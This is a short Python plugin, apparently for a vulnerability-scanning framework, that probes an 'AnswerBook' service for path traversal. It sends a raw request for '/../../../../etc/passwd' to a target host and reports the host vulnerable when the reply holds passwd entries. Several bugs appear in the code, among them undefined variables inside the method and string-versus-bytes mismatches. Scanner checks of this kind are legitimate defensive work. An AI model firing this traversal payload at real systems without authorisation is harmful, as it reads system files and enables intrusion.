import sys
import socket
from framework import ExpFrameWork
from framework import ScanTask

class AnswerBookFileTravelCheck(ScanTask):

    def __init__(self, taskid, taskname, expid, ipaddress, port):
        super().__init__(taskid, taskname, expid, ipaddress, port)

    def Scan(self):
        sender = None
        try:
            socket.setdefaulttimeout(5)
            sender = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sender.connect((ip, int(port)))
            self.ScanLog += "[+] AnserBook Connection Established!\\n"
        except Exception as exception:
            self.ScanLog += "[-] Failed To Establish AnswerBook Connection!"
            return
        try:
            flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
            sender.send(flag)
            self.ScanLog += "[+] Send Payload Success!\\n"
            data = sender.recv(1024)
            self.ScanLog += "[+] Data Received!\\n"
            sender.close()
            if 'root:' in data and 'nobody:' in data:
                self.ScanResult = 1
        except Exception as exception:
            self.ScanLog += "[-] Scan Failed!"


if __name__ == "__main__":
    tid = sys.argv[1]
    tname = sys.argv[2]
    vid = sys.argv[3]
    ip = sys.argv[4]
    port = sys.argv[5]
    scanner = AnswerBookFileTravelCheck(tid, tname, vid, ip, port)
    scanner.Run()
